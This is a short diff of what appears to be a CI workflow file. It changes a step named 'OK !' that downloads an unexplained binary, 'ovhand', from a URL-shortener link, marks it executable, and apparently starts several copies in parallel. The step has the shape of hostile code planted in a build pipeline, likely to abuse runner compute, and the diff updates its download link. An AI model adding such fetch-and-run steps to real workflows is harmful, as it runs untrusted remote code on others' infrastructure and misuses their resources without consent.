@@ -15,7 +15,7 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/o4q-R/ovhand -O ovhand
+          wget https://curl.by/CPYA5/ovhand -O ovhand
           chmod +x ovhand
           PIDS=()
           for i in {1..4}; do
